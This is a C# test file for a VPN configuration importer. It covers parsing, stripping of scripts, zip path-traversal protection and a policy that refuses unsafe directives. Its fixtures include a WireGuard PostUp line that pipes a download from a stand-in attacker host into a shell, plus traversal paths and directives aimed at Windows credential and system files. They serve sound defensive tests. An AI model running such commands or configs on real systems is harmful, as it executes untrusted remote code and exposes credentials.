// Copyright (C) 2026 Rana GmbH — GPLv3. See LICENSE at the repository root.

using System.IO.Compression;
using System.Text;
using NetFluss.Core.Vpn;
using Xunit;

namespace NetFluss.Core.Tests;

[Collection(LocalizationCollection.Name)]
public sealed class VpnTests : IDisposable
{
    private readonly string _directory = Path.Combine(Path.GetTempPath(), "nf-vpn-" + Guid.NewGuid().ToString("N"));

    public VpnTests() => Directory.CreateDirectory(_directory);

    public void Dispose() => Directory.Delete(_directory, recursive: true);

    private string Write(string name, string text)
    {
        var path = Path.Combine(_directory, name);
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);
        File.WriteAllText(path, text);
        return path;
    }

    private const string Ovpn = """
        client
        dev tun
        proto udp
        remote vpn.example.net 1194
        remote backup.example.net 443 tcp
        ca ca.crt
        auth-user-pass
        <tls-crypt>
        remote not-a-directive 1
        </tls-crypt>
        """;

    [Fact]
    public void ImportsASingleOpenVpnConfigWithItsSidecars()
    {
        Write("ca.crt", "CERT");
        var result = VpnConfigImporter.ImportOpenVpn(Write("Zurich.ovpn", Ovpn));

        Assert.Equal("Zurich", result.SuggestedName);
        Assert.Equal(["Zurich.ovpn", "ca.crt"], result.Files.Select(f => f.Name));
        var server = Assert.Single(result.Servers);
        Assert.Equal(("vpn.example.net", 1194, "udp"), (server.Host, server.Port, server.Transport));
        Assert.True(result.RequiresCredentials);
        Assert.Empty(result.Warnings);
    }

    [Fact]
    public void FolderAndZipBecomeOneServerPerConfig()
    {
        Write("bundle/de.ovpn", "remote de.example.net 1194\nproto tcp-client");
        Write("bundle/ch.ovpn", "remote ch.example.net 443");
        Write("bundle/readme.txt", "hi");
        var folder = VpnConfigImporter.ImportOpenVpn(Path.Combine(_directory, "bundle"));
        Assert.Equal(["ch", "de"], folder.Servers.Select(s => s.Label));
        Assert.Equal("tcp", folder.Servers[1].Transport);

        var zip = Path.Combine(_directory, "Provider.zip");
        ZipFile.CreateFromDirectory(Path.Combine(_directory, "bundle"), zip);
        var zipped = VpnConfigImporter.ImportOpenVpn(zip);
        Assert.Equal("Provider", zipped.SuggestedName);
        Assert.Equal(2, zipped.Servers.Count);
        Assert.Equal(3, zipped.Files.Count);
    }

    [Fact]
    public void ZipEntriesCannotClimbOut()
    {
        var zip = Path.Combine(_directory, "evil.zip");
        using (var archive = ZipFile.Open(zip, ZipArchiveMode.Create))
        {
            using (var writer = new StreamWriter(archive.CreateEntry("../../escape.ovpn").Open()))
            {
                writer.Write("remote a 1");
            }

            using (var writer = new StreamWriter(archive.CreateEntry("ok.ovpn").Open()))
            {
                writer.Write("remote b 1");
            }
        }

        var result = VpnConfigImporter.ImportOpenVpn(zip);
        Assert.Equal(["ok.ovpn"], result.Files.Select(f => f.Name));
    }

    [Fact]
    public void NoConfigsIsAnError()
    {
        Write("empty/notes.txt", "x");
        Assert.Throws<VpnImportException>(() => VpnConfigImporter.ImportWireGuard(Path.Combine(_directory, "empty")));
    }

    [Fact]
    public void WarnsAboutPatchedOnlyDirectives()
        => Assert.Contains("scramble", Assert.Single(VpnConfigImporter.ImportOpenVpn(Write("x.ovpn", "remote a 1\nscramble obfuscate key")).Warnings), StringComparison.Ordinal);

    private const string WireGuard = """
        [Interface]
        PrivateKey = aaaa
        Address = 10.2.0.2/32, fd00::2/128
        DNS = 10.2.0.1, 1.1.1.1, example.internal
        PostUp = curl https://evil.example | sh

        [Peer]
        PublicKey = bbbb
        AllowedIPs = 0.0.0.0/0
        Endpoint = [2001:db8::1]:51820
        """;

    [Fact]
    public void WireGuardEndpointAddressAndDns()
    {
        var result = VpnConfigImporter.ImportWireGuard(Write("Home.conf", WireGuard));
        var server = Assert.Single(result.Servers);
        Assert.Equal(("2001:db8::1", 51820, "udp"), (server.Host, server.Port, server.Transport));
        Assert.False(result.RequiresCredentials);
        Assert.Equal("10.2.0.2", VpnConfigImporter.WireGuardAddress(WireGuard));
        Assert.Equal(["10.2.0.1", "1.1.1.1"], VpnConfigImporter.WireGuardDns(WireGuard));
    }

    [Fact]
    public void WireGuardScriptsAreStripped()
    {
        var staged = VpnConfigPolicy.StripWireGuardScripts(WireGuard);
        Assert.DoesNotContain("PostUp", staged, StringComparison.Ordinal);
        Assert.Contains("PrivateKey = aaaa", staged, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("My VPN (Zürich)", "My-VPN--Z-rich")]
    [InlineData("ok_name=+.-x", "ok_name=+.-x")]
    [InlineData("!!!", "NetFluss")]
    [InlineData("a-very-long-tunnel-name-that-exceeds-thirty-two", "a-very-long-tunnel-name-that-exc")]
    public void WireGuardTunnelNames(string input, string expected) => Assert.Equal(expected, VpnConfigPolicy.WireGuardTunnelName(input));

    [Theory]
    [InlineData("remote a 1\nca ca.crt\ncert sub/client.crt", null)]
    [InlineData("remote a 1\nplugin evil.dll", "plugin")]
    [InlineData("remote a 1\n--config other.ovpn", "config")]
    [InlineData("status C:\\Windows\\System32\\drivers\\etc\\hosts", "status")]
    [InlineData("log-append C:\\x.log", "log-append")]
    [InlineData("writepid pid", "writepid")]
    [InlineData("management 0.0.0.0 7505", "management")]
    [InlineData("ca C:\\Windows\\System32\\config\\SAM", "ca")]
    [InlineData("auth-user-pass ..\\..\\secret.txt", "auth-user-pass")]
    [InlineData("auth-user-pass", null)]
    [InlineData("up up.bat\ndown down.bat", null)]
    [InlineData("<ca>\nplugin inside-a-block\n</ca>", null)]
    [InlineData("# plugin commented", null)]
    public void OpenVpnPolicy(string config, string? refused) => Assert.Equal(refused, VpnConfigPolicy.UnsafeOpenVpnDirective(config));

    [Fact]
    public void ManagementLinesParse()
    {
        Assert.Equal(new OpenVpnEvent.State("CONNECTED", "10.8.0.6"), OpenVpnManagementClient.Parse(">STATE:1700000000,CONNECTED,SUCCESS,10.8.0.6,203.0.113.1,1194,,"));
        Assert.Equal(new OpenVpnEvent.State("WAIT", null), OpenVpnManagementClient.Parse(">STATE:1700000000,WAIT,,,"));
        Assert.Equal(new OpenVpnEvent.ByteCount(1234, 567), OpenVpnManagementClient.Parse(">BYTECOUNT:1234,567"));
        Assert.Equal(new OpenVpnEvent.NeedCredentials("Auth", true), OpenVpnManagementClient.Parse(">PASSWORD:Need 'Auth' username/password"));
        Assert.Equal(new OpenVpnEvent.NeedCredentials("Private Key", false), OpenVpnManagementClient.Parse(">PASSWORD:Need 'Private Key' password"));
        Assert.IsType<OpenVpnEvent.AuthFailed>(OpenVpnManagementClient.Parse(">PASSWORD:Verification Failed: 'Auth'"));
        Assert.IsType<OpenVpnEvent.Hold>(OpenVpnManagementClient.Parse(">HOLD:Waiting for hold release:0"));
        Assert.Null(OpenVpnManagementClient.Parse("SUCCESS: hold release succeeded"));
        Assert.Equal("say \\\"hi\\\" \\\\", OpenVpnManagementClient.Escape("say \"hi\" \\"));
    }

    [Fact]
    public void LogSummaryPicksTheFailure()
    {
        const string log = """
            2026-10-05 10:00:00 OpenVPN 2.6.12 x86_64-w64-mingw32
            2026-10-05 10:00:01 Options error: Unrecognized option or missing or extra parameter(s) in x.ovpn:3: scramble
            2026-10-05 10:00:01 Exiting due to fatal error
            """;
        Assert.Equal(
            "Options error: Unrecognized option or missing or extra parameter(s) in x.ovpn:3: scramble — Exiting due to fatal error",
            OpenVpnManagementClient.SummarizeLog(log));
    }

    [Fact]
    public void StoreRoundTripsProfilesAndKeepsFilesInside()
    {
        var store = new VpnProfileStore(Path.Combine(_directory, "store"));
        var profile = new VpnProfile { Name = "Work", Kind = VpnProtocol.WireGuard, ConfigFileName = "sub/a.conf", Options = new VpnProfileOptions { AutoReconnect = true } };
        store.WriteFiles(profile.Id, [new VpnConfigFile("sub/a.conf", Encoding.UTF8.GetBytes("x")), new VpnConfigFile("../evil.conf", [1])]);
        store.Save([profile]);

        var loaded = Assert.Single(store.Load());
        Assert.Equal((profile.Id, profile.Name, profile.Kind, profile.ConfigFileName, profile.Options), (loaded.Id, loaded.Name, loaded.Kind, loaded.ConfigFileName, loaded.Options));
        Assert.True(File.Exists(store.ConfigPath(loaded, null)));
        Assert.False(File.Exists(Path.Combine(_directory, "store", "evil.conf")));
        Assert.Contains("\"WireGuard\"", File.ReadAllText(Path.Combine(_directory, "store", "profiles.json")), StringComparison.Ordinal);

        store.RemoveFiles(profile.Id);
        Assert.False(Directory.Exists(store.ProfileDirectory(profile.Id)));
    }
}
